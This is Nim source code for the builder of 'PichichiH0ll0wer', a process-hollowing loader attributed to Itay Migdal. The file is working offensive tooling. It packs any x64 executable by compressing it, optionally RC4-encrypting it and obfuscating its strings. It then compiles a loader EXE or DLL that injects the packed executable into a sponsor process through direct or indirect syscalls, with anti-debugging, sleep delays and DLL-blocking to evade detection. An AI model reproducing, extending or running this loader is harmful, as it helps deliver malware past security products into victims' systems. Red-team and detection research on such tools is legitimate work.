import RC4
import osproc
import argparse
import ptr_math
import strformat
import supersnappy
import winim/inc/[rpc, windef]
from std/base64 import encode


# YOU HAVE TO HAVE A TOOL BANNER
const pichichiBanner = """

      ____  _      __    _      __    _    __  ______  ________                    
     / __ \(_)____/ /_  (_)____/ /_  (_)  / / / / __ \/ / / __ \_      _____  _____
    / /_/ / / ___/ __ \/ / ___/ __ \/ /  / /_/ / / / / / / / / / | /| / / _ \/ ___/
   / ____/ / /__/ / / / / /__/ / / / /  / __  / /_/ / / / /_/ /| |/ |/ /  __/ /    
  /_/   /_/\___/_/ /_/_/\___/_/ /_/_/  /_/ /_/\____/_/_/\____/ |__/|__/\___/_/     

                         .:=+++-:.
                      :+#%@@@%*+=:
                    =#@@@@%%%%#+-.    .::.
                  -#%#**+++++=-:::::.:--:.
        -..     :=*++===-------=======---:
        ::::..:+++++++++++++=============++=
        .-:::=*+++++###*****++++++++++**#%%%:
          ::=*+++++++#@@@%%%%%#*++++*#%%%%%-
           .***++++++**-:--==+*%#++#%####*+
           .***+++++#+      .::.+***:   .+#
           .**#*+*+**     .*%@%#-+*:-*+   #-
            *#%#+*+#=       **%@%+*.-#%:  **.
            =###+**#+      =#=%@*+#+-+=:.=*+=.
             #**#***#:     -*#*=-+:+**#####*=*-
             -#*%#***#-        :#*=*####***##**=
              +###****#*=::::=*##*#**************:
              =##**%#***######******************##=
            .+####*%%#**************************-=#*.
           :##*=##*#%#********************+*****.  +#=
          =#+:  *#####******************+=*#***+  :+##+.
        :**     =##%#******************+*##***#-  . +=+:
       -**=:    -#####***********#########****#.      .
      .===..    -######################**###*#+
                -#############################=
                :#############################-
                .#############################:
                 *##########*+=--:::-=*######*
                 =#######+:            =#####-
                 .#####*.               =###-
                  =###-                 .##:
              .....*#-::::..........:-=+**: ...........
  .................:+##*=-:..........:::-:.:......................                                                                 

    >>  Process hollowing loader
        https://github.com/itaymigdal/PichichiH0ll0wer
        By Itay Migdal
"""

# Declare arguments
var pePath: string
var injectionMethod: string
var sponsorPath: string
var sponsorParams: string
var outFormat: string
var outDllExportName: string  
var isBlockDlls: bool
var isSplit: bool
var sleepSeconds: string
var sleepBetweenSteps: string
var antiDebugg: string
var key: string
var isVeh: bool
var isDebug: bool
var isEncrypted: bool
var payload: string


# Define compiler args
var compileExeCmd = "nim compile --app:console"         # exe format
var compileDllCmd = "nim compile --app:lib --nomain"    # dll format
var compileExePath = " Loader/main.nim"                 # for source exe
var compileDllPath = " Loader/dll.nim"                  # for source dll
var compileOutExe = " -o:PichichiH0ll0wer.exe"          # for compiled exe
var compileOutDll = " -o:PichichiH0ll0wer.dll"          # for compiled dll
var compileFlags = " --cpu=amd64"                       # for windows 64 bit
compileFlags.add " -d:release -d:strip --opt:none"      # for minimal size   # --opt:size casuing runtime erros here!
compileFlags.add " --passL:-Wl,--dynamicbase"           # for relocation table (needed for loaders)
compileFlags.add " --benchmarkVM:on"                    # for NimProtect key randomization
compileFlags.add " --maxLoopIterationsVM:100000000"     # for RC4'ing big files


when isMainModule:
    # Define arguments
    var p = newParser:
        help(pichichiBanner)
        arg("exe-file", help="Exe file to load")
        arg("injection-method", help="""Injection method

        1 - Simple hollowing
        2 - Direct syscalls hollowing
        3 - Indirect syscalls hollowing
        4 - Split hollowing using multiple processes
        5 - Split hollowing using multiple processes and direct syscalls
        6 - Split hollowing using multiple processes and indirect syscalls
        """)
        option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
        option("-a", "--args", help="Command line arguments to append to the hollowed process")
        option("-f", "--format", help="PE hollower format", choices = @["exe", "dll"], default=some("exe"))
        option("-e", "--export", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
        flag("-b", "--block", help="Block unsigned Microsoft Dlls in the hollowed process")
        flag("-p", "--split", help="Split and hide the payload blob in hollower (takes long to compile!)")
        option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
        option("-z", "--sleep-step", help="Number of seconds to sleep between each step (x4)", default=some("0"))
        option("-g", "--anti-debug", help="Action to perform upon debugger detection", choices = @["none", "die", "troll"], default=some("none"))
        option("-k", "--key", help="RC4 key to [en/de]crypt the payload (supplied as a command line argument to the hollower)", default=some(""))
        flag("-v", "--veh", help="Hollow will occur within VEH")
        flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
    # Parse arguments
    try:
        var opts = p.parse()
        pePath = opts.exe_file
        injectionMethod = opts.injection_method
        if opts.sponsor == "":
            sponsorPath = "getAppFilename()"
        else:
            sponsorPath = "protectString(r\"" & opts.sponsor & "\")"        
        sponsorParams = opts.args
        outFormat = opts.format
        outDllExportName = opts.export
        isBlockDlls = opts.block
        isSplit = opts.split
        sleepSeconds = opts.sleep
        sleepBetweenSteps = opts.sleep_step
        antiDebugg = opts.anti_debug
        key = opts.key
        isVeh = opts.veh
        isDebug = opts.debug
    except ShortCircuit as err:
        if err.flag == "argparse_help":
            echo err.help
            quit(1)
    except UsageError:
        echo pichichiBanner
        echo "[-] " & getCurrentExceptionMsg()
        echo "[i] Use -h / --help\n"
        quit(1)

    if outFormat == "dll" and isDebug:
        echo "[-] Dll payload cannot print messages"
        quit(1)

    # Validate exe
    var peStr = readFile(pePath)
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageMagic = cast[size_t](peImageNtHeaders.OptionalHeader.Magic)
    if peImageMagic != 523:
        echo "[-] Payload is not a valid x64 PE"
        quit(1)

    # Compress & encode exe payload
    var compressedPe = compress(peStr)

    # (Encrypt and) Encode payload if key supplied
    if key != "":
        payload = encode(toRC4(key, compressedPe))
        isEncrypted = true
    else:
        payload = encode(compressedPe)
        isEncrypted = false

    # Write the parameters to the loader params
    var paramsPath = "Loader/params.nim"
    var payloadLine: string
    if isSplit:
        payloadLine = fmt"""var payload* = splitString(protectString("{payload}"))"""
    else:
        payloadLine = fmt"""var payload* = protectString("{payload}")"""
    var paramsToHollower = fmt"""
import os
import nimprotect

{payloadLine}
var sponsorPath* = {sponsorPath}
var sponsorParams* = protectString(r" {sponsorParams}")
var dllExportName* = protectString("{outDllExportName}") 
var isBlockDlls* = {isBlockDlls}
var antiDebugAction* = protectString("{antiDebugg}")
var sleepSeconds* = {sleepSeconds}
var sleepBetweenSteps* = {sleepBetweenSteps}
var isVeh* = {isVeh}
var isEncrypted* = {isEncrypted}
    """
    writeFile(paramsPath, paramsToHollower)

    # Choose injection method
    if injectionMethod == "1":
        compileFlags.add(" -d:hollow1")
    elif injectionMethod in "2":
        compileFlags.add(" -d:hollow2")
    elif injectionMethod == "3":
        compileFlags.add(" -d:hollow3")
    elif injectionMethod == "4":
        compileFlags.add(" -d:hollow4")
    elif injectionMethod == "5":
        compileFlags.add(" -d:hollow5")
    elif injectionMethod in "6":
        compileFlags.add(" -d:hollow6")
    else:
        echo "[-] Injection method doesn't exist :("
        quit(1)
        
    # Change to debug if needed
    if isDebug:
        compileFlags = compileFlags.replace("-d:release ", "")

    # Compile
    var compileCmd: string
    if outFormat == "exe":
        compileCmd = compileExeCmd & compileFlags & compileOutExe & compileExePath
    elif outFormat == "dll":
        # Write the dll file that contains the export function
        var nimDllPath = "Loader/dll.nim"
        var nimDllcontent = fmt"""
import main
import params

proc NimMain() {{.cdecl, importc.}}

proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
    NimMain()
    main()
        """
        writeFile(nimDllPath, nimDllcontent)
        compileCmd = compileDllCmd & compileFlags & compileOutDll & compileDllPath
    echo "[*] Compiling Loader: " & compileCmd
    var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
    if res[1] == 0:
        echo "[+] Compiled successfully" 
        if injectionMethod in ["4", "5", "6"]:
            echo "[i] Run the hollower with '-M' argument"
        if key != "":
            echo fmt"[i] Run the hollower with '-K:{key}' argument"
    else:
        echo "[-] Error compiling. compilation output:"
        echo res[0]


    
